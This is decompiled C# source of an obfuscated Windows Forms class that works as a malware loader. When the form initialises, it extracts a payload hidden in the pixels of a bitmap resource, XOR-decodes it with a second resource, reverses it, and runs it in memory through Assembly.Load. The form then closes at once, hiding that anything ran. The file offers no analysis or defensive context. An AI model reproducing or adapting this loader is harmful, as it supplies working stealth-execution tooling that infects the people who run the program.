using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using WDKtUqRFCa.Properties;

namespace WDKtUqRFCa;

public class RoWLQEZoCMM : Form
{
	private IContainer components = null;

	private string[] APHiejMTDJdsGQWle;

	private byte[] MzmkGOgzSdwkiwv;

	private byte[] lcJLWbCZxICjtMqfzxq;

	private BitmapData vgXuYVTDRxOsGJjuEa;

	private IntPtr UpYBiFBqDdGsDwEOVWA;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(489, 199));
		((Control)this).set_Name("RoWLQEZoCMM");
		((Control)this).set_Text("RoWLQEZoCMM");
		((Form)this).add_Load((EventHandler)RoWLQEZoCMM_Load);
		((Control)this).ResumeLayout(false);
		Bitmap val = (Bitmap)Resources.ResourceManager.GetObject("fVUBqEGddLfIQk");
		byte[] array = new byte[((Image)val).get_Width() * ((Image)val).get_Height() * 4];
		Rectangle rectangle = new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height());
		vgXuYVTDRxOsGJjuEa = val.LockBits(rectangle, (ImageLockMode)3, ((Image)val).get_PixelFormat());
		Marshal.Copy(vgXuYVTDRxOsGJjuEa.get_Scan0(), array, 0, array.Length);
		lcJLWbCZxICjtMqfzxq = (byte[])Resources.ResourceManager.GetObject("MrrDqPndKJNdHIQe");
		int num = 0;
		for (int i = 0; i < 4; i++)
		{
			int num2 = 1;
			for (int j = 0; j < i; j++)
			{
				num2 *= 256;
			}
			num += num2 * array[i];
		}
		MzmkGOgzSdwkiwv = new byte[num];
		for (int i = 0; i < MzmkGOgzSdwkiwv.Length; i++)
		{
			MzmkGOgzSdwkiwv[i] = array[i + 4];
		}
		vLfsQImWdnJz(ref MzmkGOgzSdwkiwv, lcJLWbCZxICjtMqfzxq);
		byte[] array2 = new byte[MzmkGOgzSdwkiwv.Length];
		for (int i = 0; i < array2.Length; i++)
		{
			array2[i] = MzmkGOgzSdwkiwv[i];
		}
		for (int i = 0; i < array2.Length; i++)
		{
			MzmkGOgzSdwkiwv[MzmkGOgzSdwkiwv.Length - i - 1] = array2[i];
		}
		SPdcdZKeMPF(MzmkGOgzSdwkiwv, APHiejMTDJdsGQWle);
	}

	public RoWLQEZoCMM(string[] args)
	{
		APHiejMTDJdsGQWle = args;
		InitializeComponent();
	}

	public static void vLfsQImWdnJz(ref byte[] MzmkGOgzSdwkiwv, byte[] lcJLWbCZxICjtMqfzxq)
	{
		for (int i = 0; i < MzmkGOgzSdwkiwv.Length; i++)
		{
			for (int j = 0; j < lcJLWbCZxICjtMqfzxq.Length; j++)
			{
				MzmkGOgzSdwkiwv[i] = (byte)(MzmkGOgzSdwkiwv[i] ^ lcJLWbCZxICjtMqfzxq[j]);
			}
		}
	}

	public static void SPdcdZKeMPF(byte[] MzmkGOgzSdwkiwv, string[] APHiejMTDJdsGQWle)
	{
		Assembly assembly = Assembly.Load(MzmkGOgzSdwkiwv);
		assembly.EntryPoint!.Invoke(null, new object[1] { APHiejMTDJdsGQWle });
	}

	private void RoWLQEZoCMM_Load(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
